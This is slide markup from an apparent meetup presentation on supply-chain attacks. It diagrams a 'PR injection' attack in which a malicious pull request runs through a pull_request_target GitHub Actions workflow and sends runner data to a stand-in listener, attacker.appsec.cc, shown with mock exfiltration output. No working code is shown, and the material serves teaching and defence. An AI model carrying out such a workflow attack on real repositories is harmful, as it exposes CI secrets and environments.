          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Pushes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Ellipse 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5870BA19-D6D2-9E66-70D1-3DBBB08495DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4908760" y="3267000"/>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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="62" name="Connecteur : en arc 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18A8B264-1892-5124-8787-B850BCEB8E72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipH="1" flipV="1">
            <a:off x="4130240" y="2524583"/>
            <a:ext cx="55200" cy="1717000"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val -41413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5" name="Ellipse 1024">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45069A13-630C-DED1-0B29-6E42DD696FFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3074378" y="3412513"/>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3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1028" name="ZoneTexte 1027">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE828C65-C033-AFA9-0E51-CAFF915940CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2921983" y="3096261"/>
            <a:ext cx="1008000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Opens PR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1029" name="Ellipse 1028">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFBF5734-6728-B79B-E33E-665CF3FFD939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4344921" y="5216943"/>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4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1032" name="ZoneTexte 1031">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE2CFFB9-08F4-21EA-C2D9-70C270368E37}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4214239" y="4669357"/>
            <a:ext cx="2884063" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Executes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> on the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> repo env.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>on: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>pull_request_target</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1033" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{188D60A1-3828-8B5F-FC6F-64E14A1AEA27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4153280" y="2354663"/>
            <a:ext cx="3156295" cy="1495100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>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035" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0388BEA0-9665-20D7-3448-5C1790F4CF6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4185440" y="4195576"/>
            <a:ext cx="3156295" cy="1495100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>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1042" name="Picture 18" descr="Githubactions icon - Free Download PNG &amp; SVG | Streamline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A3D5409D-8914-3DE1-3376-90EBFD0BA2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3018" y="5191247"/>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1040" name="ZoneTexte 1039">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0116FDD1-FD78-927B-0A20-DF4565DFE5E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9183566" y="4195576"/>
            <a:ext cx="2901670" cy="1384995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>[!] EXFILTRATED DATA RECEIVED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  Content-Type : application/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>json</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  Raw body     :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>{"hostname":"runnervm3jyl0","username":</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>runner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>","</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>cwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>":"/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>runner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>/...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1041" name="Connecteur droit 1040">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C79738ED-20F4-360E-49C1-3150149BDB58}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9069468" y="2974976"/>
            <a:ext cx="0" cy="2736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1043" name="Connecteur droit avec flèche 1042">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B1DEF41-B470-B1D2-DC65-5427BC29EA92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589763" y="5212906"/>
            <a:ext cx="1332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044" name="Ellipse 1043">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DA7E87D-A2CC-6F36-5B08-E1A28567680A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8093763" y="5260738"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1045" name="ZoneTexte 1044">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BD19B04-295B-325F-9F5D-E324FA500E7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7530441" y="4867102"/>
            <a:ext cx="1450645" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Sends</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1046" name="Picture 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E1CF5ED3-92C0-8CBA-4769-EC9274B05E7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85312" y="2243794"/>
            <a:ext cx="360000" cy="394521"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1047" name="ZoneTexte 1046">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10D47AE5-C234-41EA-65A5-88AD1124523E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9689948" y="2227442"/>
            <a:ext cx="1179792" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>listener</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1226453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0F9EE73-66EB-2182-4BD1-A2FBC49FF117}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>PR injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 4" descr="Icônes, logos, symboles Server– Téléchargement gratuit aux ...">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96E7646D-39E1-5C06-16D8-E58A49E95D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334" t="7259" r="7482" b="7703"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6759307" y="1183636"/>
            <a:ext cx="360000" cy="359375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="ZoneTexte 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{73561E69-746C-FA79-5CBA-46E3770C2C0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4208480" y="1178729"/>
            <a:ext cx="1720886" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://github.com</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B4849CE5-F549-334A-9E60-49FCFC6ED594}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4078300" y="1068056"/>
            <a:ext cx="3365014" cy="298007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pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 2" descr="Github - Free logo icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B5AF89C-0DF7-F9B3-ED7E-5F4E007E40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8433" y="1195266"/>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9" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E7D35B6-9D40-FE61-0108-4B87E77B5BE7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="191547" y="1068055"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="10" name="Groupe 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A4427D3-94FA-8F0B-95C2-7DC8529330FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="283730" y="1162691"/>
            <a:ext cx="2160000" cy="1046866"/>
            <a:chOff x="349612" y="1188253"/>
            <a:chExt cx="2160000" cy="1046866"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="11" name="Picture 12" descr="Crime Hacker Icon SVG Vector &amp; PNG Free Download | UXWing">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{491FFB31-8F13-AE77-BE7F-2370829E0F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12" y="1557295"/>
              <a:ext cx="720000" cy="63564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Laptop - Free computer icons">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{44735F9B-B1AE-CB11-A2BD-B856693A91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8972" y="1515119"/>
              <a:ext cx="720000" cy="720000"/>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9C4B8AAF-A7C5-D0FC-ADF0-784B50C772CE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="349612" y="1188253"/>
              <a:ext cx="2160000" cy="307777"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
                <a:t>Attacker</a:t>
              </a:r>
              <a:endParaRPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="ZoneTexte 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CBB8408C-9853-1F43-0768-A6001BCD00A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4153278" y="1705056"/>
            <a:ext cx="2966029" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>meetup-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>supply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0" err="1"/>
              <a:t>chain-attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" u="sng" dirty="0"/>
              <a:t>03_pr-injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E863797E-190C-6C06-4EA1-E98E61B7B86B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9069468" y="1051672"/>
            <a:ext cx="2260600" cy="1368000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx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7" name="ZoneTexte 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CCD8176-3F9C-F9CF-02AE-3B82FC3F94CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9183566" y="1178778"/>
            <a:ext cx="2160000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https://attacker.appsec.cc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="Picture 14" descr="Pull request - Free ui icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB1F9435-1A37-E573-ACF0-C9A166DA9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6772" y="2410147"/>
            <a:ext cx="360000" cy="360000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Ellipse 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1E0F12FB-028B-DE4A-50DB-1ED719040D48}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2948614" y="2419672"/>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1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="30" name="Connecteur : en arc 29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0A8CE33-F5E0-E293-BE02-8A01EE9989A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipH="1" flipV="1">
            <a:off x="4092140" y="2073783"/>
            <a:ext cx="55200" cy="720000"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val -41413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0A16EDE6-A298-7EEC-23D9-8F7D5BA3AB6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2809690" y="2111895"/>
            <a:ext cx="1008000" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>Opens PR</a:t>
            </a:r>
          </a:p>
